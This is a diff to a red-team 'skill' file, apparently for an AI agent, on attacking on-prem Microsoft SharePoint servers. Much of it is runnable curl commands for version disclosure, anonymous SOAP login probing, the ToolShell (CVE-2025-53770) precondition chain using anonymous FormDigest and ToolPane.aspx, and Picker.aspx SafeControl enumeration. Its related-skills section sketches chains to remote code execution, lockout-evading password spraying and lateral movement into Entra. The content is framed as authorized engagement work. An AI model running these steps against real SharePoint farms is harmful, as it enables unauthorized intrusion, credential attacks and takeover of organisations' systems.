@@ -1,8 +1,11 @@
 ---
 name: hunt-sharepoint
 description: Hunt Microsoft SharePoint Server (2013/2016/2019/Subscription Edition) on-prem farms — anonymous endpoint enumeration, version disclosure, legacy SOAP login bypass (Authentication.asmx), ToolShell precondition chain (CVE-2025-53770), SafeControl reflection enumeration via Picker.aspx, NTLM Type-2 AD topology disclosure, custom-branding module discovery, EoL farm permanent-CVE-window exploitation, FormDigest anonymous issuance, file-extension blocklist NOT-an-oracle pattern, custom-zone Forms auth bridging on-prem AD. Use when target has SharePoint headers (SPRequestGuid, X-MS-InvokeApp, X-SharePointHealthScore, MicrosoftSharePointTeamServices) or paths (/_layouts/15/, /_vti_bin/, /_api/, /_catalogs/).
-sources: github, authorized-engagement
-report_count: 1
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [sharepoint, hunt, redteam, microsoft]
 ---
 
 ## Crown Jewel Targets
@@ -34,7 +37,7 @@ X-MS-InvokeApp: 1; RequireReadOnly              (SharePoint web request)
 X-SharePointHealthScore: 0                      (SharePoint specific)
 SPIisLatency: <ms>                              (SharePoint internal timing)
 SPRequestDuration: <ms>                         (SharePoint request duration)
-MicrosoftSharePointTeamServices: 15.0.0.0      (often stripped by ELB — but if present, exact version)
+MicrosoftSharePointTeamServices: [REDACTED_IP]      (often stripped by ELB — but if present, exact version)
 X-Forms_Based_Auth_Required: <login URL>        (Forms-auth zone indicator)
 X-Forms_Based_Auth_Return_Url: <return URL>     (Forms-auth zone indicator)
 X-MSDAVEXT_Error: 917656; Access denied...      (WebDAV extension active)
@@ -102,17 +105,17 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    ```bash
    # Method 1: _vti_inf.html (always anonymous, always present)
-   curl -sk "https://target.example/_vti_inf.html"
-   # → FPVersion="15.00.0.000" (15.x = SP2013, 16.x = SP2016/2019/SE)
+   curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_vti_inf.html"
+   # → FPVersion="[REDACTED_IP]" (15.x = SP2013, 16.x = SP2016/2019/SE)
 
    # Method 2: _api/contextinfo POST (anonymous on most farms)
-   curl -sk -X POST "https://target.example/_api/contextinfo" \
+   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_api/contextinfo" \
      -H "Accept: application/json;odata=verbose" \
      | jq -r '.d.GetContextWebInformation.LibraryVersion'
    # → "15.0.5545.1000" (full build number)
 
    # Method 3: /_layouts/15/start.aspx body
-   curl -sk "https://target.example/_layouts/15/start.aspx" \
+   curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/start.aspx" \
      | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+|16\.[0-9]+\.[0-9]+\.[0-9]+"
    ```
 
@@ -154,7 +157,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    ```bash
    # First: confirm Mode = Forms (else this attack vector is N/A)
-   curl -sk -X POST "https://target.example/_vti_bin/Authentication.asmx" \
+   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_vti_bin/Authentication.asmx" \
      -H "Content-Type: text/xml; charset=utf-8" \
      -H "SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Mode" \
      -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Mode xmlns="http://schemas.microsoft.com/sharepoint/soap/" /></soap:Body></soap:Envelope>'
@@ -172,18 +175,18 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    ```bash
    # Sub-step a: anonymous GET on ToolPane.aspx
-   curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
+   curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
    # Body should contain: __REQUESTDIGEST="0x...,..."  AND  __VIEWSTATEENCRYPTED=""
    # If both: precondition stack is anonymous-reachable.
 
    # Sub-step b: anonymous POST to /_api/contextinfo
-   curl -sk -X POST "https://target.example/_api/contextinfo" \
+   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_api/contextinfo" \
      -H "Accept: application/json;odata=verbose" \
      | jq -r '.d.GetContextWebInformation.FormDigestValue'
    # Should return a valid digest with 1800s validity.
 
    # Sub-step c: anonymous POST to ToolPane.aspx with that digest as X-RequestDigest
-   curl -sk -X POST "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
+   curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
      -H "X-RequestDigest: <digest from step b>" \
      --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none"
    # Should return 200 OK — server treats anonymous-with-digest as authorised state-changing POST.
@@ -206,7 +209,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
 6. **SafeControl enumeration via Picker.aspx.** Picker.aspx differentiates two error states by class existence:
    - Type EXISTS but not whitelisted: `"Only PickerDialog types can be used with the dialog. The type should be configured as a safecontrol in this site."`
-   - Type DOES NOT exist: `"Could not load type '<Class>' from assembly 'Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c'."`
+   - Type DOES NOT exist: `"Could not load type '<Class>' from assembly 'Microsoft.SharePoint, Version=[REDACTED_IP], Culture=neutral, PublicKeyToken=71e9bce111e9429c'."`
 
    Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` and `Microsoft.SharePoint.WebPartPages.*` types to enumerate reachable classes. The list itself is recon for CVE-2019-0604-family chains.
 
@@ -216,7 +219,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
      "Microsoft.SharePoint.WebControls.ItemPicker" \
      "Microsoft.SharePoint.WebPartPages.DataFormWebPart" \
      ; do
-     curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$cls")&typeName=System.String" \
+     curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$cls")&typeName=System.String" \
        | grep -oE "<title>[^<]+</title>"
    done
    ```
@@ -235,7 +238,7 @@ HelpWindowKey('WSSEndUser_troubleshooting                  (anonymous error.aspx
 
    ```bash
    for sub in pages Pages js Js JS css scripts handlers controls images config data services api; do
-     curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
+     curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
        "https://target.example/_layouts/15/CustomerName/$sub/"
      # 301/302 with auth-redirect = directory exists; 404 = missing; 403 = directory listing blocked but path valid
    done
@@ -283,18 +286,18 @@ Response codes:
 **ToolShell precondition reproduction:**
 ```bash
 # Step 1: anon GET ToolPane.aspx
-TP=$(curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
+TP=$(curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
 echo "$TP" | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'
 # If value="" → precondition
 
 # Step 2: anon FormDigest
-DIGEST=$(curl -sk -X POST "https://target.example/_api/contextinfo" \
+DIGEST=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_api/contextinfo" \
   -H "Accept: application/json;odata=verbose" \
   | jq -r '.d.GetContextWebInformation.FormDigestValue')
 echo "Digest: ${DIGEST:0:40}..."
 
 # Step 3: anon POST ToolPane with digest
-curl -sk -X POST -H "X-RequestDigest: $DIGEST" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST -H "X-RequestDigest: $DIGEST" \
   --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none" \
   "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
   -w "\ncode=%{http_code} size=%{size_download}\n"
@@ -320,7 +323,7 @@ Expected back-end hang: ~12 s vs ~0.16 s baseline (consistent across 5 trials). 
 
 **Picker.aspx SafeControl recon:**
 ```bash
-curl -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
+curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
   | grep -oE "<title>[^<]+</title>"
 # "Only PickerDialog types..." = exists, not whitelisted
 # "Could not load type..."    = does not exist
@@ -428,6 +431,39 @@ Same target. Feeding `Microsoft.SharePoint.WebPartPages.DataFormWebPart` (the ca
 
 ---
 
+## Verification
+
+Run this self-test to confirm sharepoint hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-sharepoint" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **SharePoint version disclosure without CVE** — knowing the SP version is informational. Need a matching exploitable CVE.
+- **/_layouts/ accessible but no anonymous operations** — path reachability is recon. Need anonymous read/write/execute.
+- **EoL SharePoint without exploitation** — "SharePoint 2013 is EoL" is a hygiene finding, not a vulnerability. Need demonstrated exploit.
+- **FormDigest anonymous issuance** — `_api/contextinfo` returning FormDigest anonymously is a precondition for ToolShell, not a standalone bug.
+- **Modern vs Classic auth** — SharePoint Online uses Modern Auth (OAuth). On-prem SP may use Classic (NTLM/Kerberos). Different attack surfaces.
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous Login calls on misconfigured farms. Chain primitive: SharePoint anon SOAP login probe → if response yields cookie or success differential → `hunt-auth-bypass` brute-force matrix (username enumeration via timing, password spray with low-and-slow against the same SOAP endpoint that bypasses ADFS-level lockout) → valid cred → `/_layouts/15/` authenticated surface.
@@ -435,3 +471,4 @@ Same target. Feeding `Microsoft.SharePoint.WebPartPages.DataFormWebPart` (the ca
 - **`hunt-aspnet`** — SharePoint is ASP.NET Webforms under the covers; ViewState, machineKey, and SafeControl reflection all apply. Chain primitive: SharePoint version disclosure → confirm patch level missing → `hunt-aspnet` ViewState dual-parser MAC-bypass → deserialization gadget → RCE in `w3wp.exe` as farm account.
 - **`hunt-rce`** — ToolShell precondition chain (CVE-2025-53770) is the current high-impact SP RCE path. Chain primitive: ToolShell preconditions met (`/_layouts/15/ToolPane.aspx?DisplayMode=Edit` reachable via the CVE-2025-49706 auth bypass — a crafted `Referer` header pointing at ToolPane.aspx — + version vulnerable) → `hunt-rce` deserialization gadget chain → SYSTEM/farm-account shell → `m365-entra-attack` lateral via stolen on-prem service-account token to Entra-synced identity.
 - **`triage-validation`** — SharePoint farms generate a lot of "looks like a finding" hygiene noise (FormDigest issuance, version disclosure, extension blocklist quirks). Chain primitive: run every SP finding through the 7-Question Gate before reporting — most version-disclosure-only findings die at "is this actually exploitable on this farm" without a paired CVE PoC.
+- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
